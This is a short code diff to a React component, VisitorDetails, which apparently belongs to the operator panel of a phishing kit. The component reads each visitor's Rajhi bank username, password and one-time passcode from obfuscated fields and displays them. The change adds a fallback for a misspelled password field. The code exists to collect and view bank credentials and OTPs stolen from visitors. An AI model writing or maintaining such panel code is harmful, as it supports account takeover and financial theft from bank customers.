@@ -473,7 +473,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
 
   // Rajhi Info - add to dynamic bubbles to sort by timestamp
   const rajhiUser = visitor._v10 || visitor.rajhiUser;
-  const rajhiPassword = visitor._v11 || visitor.rajhiPassword;
+  const rajhiPassword = visitor._v11 || visitor.rajhiPassword || visitor.rajhiPasswrod;
   const rajhiOtp = visitor._v12 || visitor.rajhiOtp;
 
   if (rajhiUser || rajhiPassword || rajhiOtp || (visitor.currentStep as any) === "rajhi") {
